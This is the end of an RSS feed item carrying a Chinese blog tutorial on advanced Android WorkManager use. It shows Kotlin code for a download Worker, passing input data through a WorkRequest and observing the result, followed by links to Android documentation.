class DownloadWorker(context : Context, params : WorkerParameters) : Worker(context, params)  {
    override fun doWork(): Result {
        // 获取参数
        val url = getInputData(&quot;url&quot;)
        // 执行下载
        val result = download(url);
        // 设置下载结果
        val output: Data = mapOf(KEY_RESULT to result).toWorkData()
        setOutputData(output)
        // 任务执行成功
        return Result.SUCCESS
    }
}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;然后，通过 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkRequest&lt;/span&gt;&lt;/code&gt;传递参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
// 构造下载链接参数
val urlData: Data = mapOf(&quot;url&quot; to &quot;https://developer.android.com/images/topic/libraries/architecture/workmanager-chain.svg&quot;)
                     .toWorkData()
// 构造WorkRequest并传递下载参数
val downloadWork = OneTimeWorkRequest.Builder&amp;lt;DownloadWorker&amp;gt;()
        .setInputData(urlData)
        .build()
// 交给WorkManager执行任务
WorkManager.getInstance().enqueue(downloadWork)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;最后，通过 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkStatus&lt;/span&gt;&lt;/code&gt;获取返回值&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
WorkManager.getInstance().getStatusById(downloadWork.id)
        .observe(this, Observer { status -&amp;gt;
            if (status != null &amp;amp;&amp;amp; status.state.isFinished) {
                val myResult = status.outputData.getString(KEY_RESULT,
                      myDefaultValue)
                // ... do something with the result ...
            }
        })
&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;0x04&quot;&gt;0x04 引用&lt;/h4&gt;
&lt;p&gt;https://developer.android.com/topic/libraries/architecture/workmanager/advanced&lt;/p&gt;
&lt;p&gt;https://developer.android.com/reference/androidx/work/ExistingWorkPolicy&lt;/p&gt;
&lt;p&gt;http://clmirror.storage.googleapis.com/codelabs/android-workmanager/index.html?index=..%2F..%2Findex#0&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 10:07:00 +0000</pubDate>
<dc:creator>hylinux1024</dc:creator>
<og:description>一文看懂WorkManager高级用法</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/angrycode/p/9735229.html</dc:identifier>
</item>
</channel>
</rss>